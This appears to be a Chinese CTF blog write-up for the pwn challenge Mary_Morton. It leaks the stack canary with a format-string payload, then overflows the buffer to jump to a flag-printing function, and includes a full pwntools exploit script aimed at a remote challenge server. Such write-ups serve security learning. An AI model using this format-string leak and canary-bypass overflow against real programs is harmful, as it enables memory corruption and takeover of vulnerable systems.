# Mary_Mortion

Canary开启，是一个随机数，x86-64架构下通过fs:0x28来获取这个数据存放在栈中。在退出栈之前，会对栈中的canary值进行检测。

![nC9EbD](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/nC9EbD.png)

栈其实玩儿的挺少的，简单看了一下发现，canary是在一个fork进程中应该是不会变的。

![0SqIOT](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/0SqIOT.png)

这样就简单了，根据下面操作

- 通过FMT漏洞获取Canray的值
- 在栈溢出时，将Canray填写到正确位置。



## FMT

通过构造`"8%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"`这样的输入，获取canray的地址。

发现canray在第二十三个，于是构造`"4%23$p`

```python
#leak canary
fun2("4%23$p")
p.recvline()
p.recv(1)
can=p.recv(18)[2:18]
#print "[*]canary => "+can
can_int=int(can,16)
print "[*]canary => "+hex(can_int)
```

## BufferOverFlow

只需要将canary填写到rbp-8点位置，然后让程序跳转到cat flag的函数即可。

```python
#Overflow
flag=0x4008da
#fun1("A"*0x88+p64(can_int)+p64(0)+p64(0x000000000040065d)+p64(0)+p64(flag))
fun1("A"*0x88+p64(can_int)+p64(0)+p64(flag))
```

我本地居然没有跑出来。。。原因未知，调试了好久都读取不了文件。一开始一直以为是栈对齐问题。。。浪费时间。远程一跑就出来了。。。还是system的问题，所以利用还是多用execve，这种题目真的够了，可玩性太低。

![jAEec3](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/jAEec3.png)



## EXP

```python
#!/usr/bin/python
from pwn import *
import binascii

p=remote("111.198.29.45","47959")
#p=process("./pwn")
#context.log_level='Debug'
#gdb.attach(p,"b *0x4009D9")


def fun1(input):
	#p.recvuntil("3. Exit the battle")
	p.sendline(str(1))
	p.sendline(input)

def fun2(input):
	p.recvuntil("3. Exit the battle")
	p.sendline(str(2))
	p.sendline(input)

#fun1("A"*0x100)
raw_input("enter after click c in the gdb") #Debug
#fun2("8%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")

#leak canary
fun2("4%23$p")
p.recvline()
p.recv(1)
can=p.recv(18)[2:18]
#print "[*]canary => "+can
can_int=int(can,16)
print "[*]canary => "+hex(can_int)

#Overflow
flag=0x4008da
#fun1("A"*0x88+p64(can_int)+p64(0)+p64(0x000000000040065d)+p64(0)+p64(flag))
fun1("A"*0x88+p64(can_int)+p64(0)+p64(flag))
p.interactive()
```





# 参考

[system执行段错误]([https://www.xmcve.com/2019/05/%E5%9C%A8%E4%B8%80%E4%BA%9B64%E4%BD%8D%E7%9A%84glibc%E7%9A%84payload%E8%B0%83%E7%94%A8system%E5%87%BD%E6%95%B0%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/](https://www.xmcve.com/2019/05/在一些64位的glibc的payload调用system函数失败问题/))

![QJCSUT](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/QJCSUT.png)

